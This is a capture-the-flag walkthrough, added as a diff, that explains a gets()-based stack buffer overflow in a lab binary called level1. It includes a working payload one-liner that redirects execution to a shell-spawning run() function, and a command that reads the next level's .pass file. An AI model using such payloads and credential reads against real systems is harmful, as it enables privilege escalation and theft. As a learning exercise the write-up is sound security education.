@@ -1,0 +1,254 @@
+# Level1 Walkthrough
+
+## Goal
+
+Exploit a stack-based buffer overflow to redirect execution to the hidden `run()` function, which spawns a shell with the privileges of the next level.
+
+---
+
+## 1. Analyze the Binary
+
+Start by examining the `main()` function:
+
+```bash
+gdb ./level1
+```
+
+Inside GDB:
+
+```gdb
+disas main
+```
+
+While reviewing the assembly, you'll notice that user input is read using:
+
+```c
+gets(buffer);
+```
+
+### Why is this dangerous?
+
+`gets()` reads data from standard input **without checking the size of the destination buffer**.
+
+If the user enters more data than the buffer can hold, the extra bytes continue writing into adjacent stack memory.
+
+This is the classic **stack buffer overflow** vulnerability.
+
+---
+
+## 2. Look for Interesting Functions
+
+List all functions present in the binary:
+
+```gdb
+info functions
+```
+
+Among the functions, you'll find:
+
+```text
+0x08048444  run
+```
+
+Disassemble it:
+
+```gdb
+disas run
+```
+
+You'll see that it eventually executes:
+
+```c
+system("/bin/sh");
+```
+
+This is exactly what we want.
+
+Instead of letting the program return normally, we'll overwrite the saved return address and force execution to jump directly to `run()`.
+
+---
+
+## 3. Determine the Offset
+
+The vulnerable stack frame contains:
+
+```text
+buffer[64]
+saved EBP
+return address
+```
+
+Layout:
+
+```text
+Higher Addresses
++------------------+
+| Return Address   |
++------------------+
+| Saved EBP        |
++------------------+
+| Padding          |
++------------------+
+| Buffer (64)      |
++------------------+
+Lower Addresses
+```
+
+Through analysis, the return address is reached after:
+
+```text
+64 bytes  -> buffer
+8 bytes   -> alignment/padding
+4 bytes   -> saved EBP
+-------------------------
+76 bytes total
+```
+
+Therefore:
+
+> After 76 bytes, the next 4 bytes overwrite the saved return address.
+
+---
+
+## 4. Build the Payload
+
+We want the return address to become:
+
+```text
+0x08048444
+```
+
+Because the machine is **little-endian**, the address must be written in reverse byte order:
+
+```text
+0x08048444
+↓
+\x44\x84\x04\x08
+```
+
+Payload structure:
+
+```text
+[76 bytes padding][address of run()]
+```
+
+Example:
+
+```python
+"A"*76 + "\x44\x84\x04\x08"
+```
+
+---
+
+## 5. Exploit the Program
+
+Execute:
+
+```bash
+(python -c "print 'A'*76 + '\x44\x84\x04\x08'"; cat) | ./level1
+```
+
+### Why `; cat`?
+
+Without it, Python sends the payload and immediately closes stdin.
+
+The spawned shell would then terminate instantly.
+
+Adding:
+
+```bash
+cat
+```
+
+keeps stdin open, allowing you to interact with the shell after exploitation.
+
+---
+
+## 6. What Happens Internally?
+
+Before the overflow:
+
+```text
++------------------+
+| Original RET     |
++------------------+
+| Saved EBP        |
++------------------+
+| Buffer           |
++------------------+
+```
+
+After the overflow:
+
+```text
++------------------+
+| 0x08048444       |
++------------------+
+| AAAA             |
++------------------+
+| AAAAAAAAA...     |
++------------------+
+```
+
+When `main()` finishes, it executes:
+
+```asm
+ret
+```
+
+Normally:
+
+```text
+EIP = Original Return Address
+```
+
+After the overwrite:
+
+```text
+EIP = 0x08048444
+```
+
+Execution jumps directly into:
+
+```c
+run()
+```
+
+which executes:
+
+```c
+system("/bin/sh");
+```
+
+and gives us a shell.
+
+---
+
+## 7. Retrieve the Password
+
+Once the shell is obtained, verify the current user:
+
+```bash
+whoami
+```
+
+Then read the password for the next level:
+
+```bash
+cat /home/user/level2/.pass
+```
+
+The displayed value is the password required for **level2**.
+
+---
+
+## Key Concepts Learned
+
+- Stack-based buffer overflow
+- Unsafe use of `gets()`
+- Stack frame layout (`buffer → saved EBP → return address`)
+- Little-endian address encoding
+- Overwriting a saved return address
+- Redirecting execution flow
+- Using `ret` to jump into an existing function (`run()`)
+- Privilege escalation through a SUID binary and spawned shell
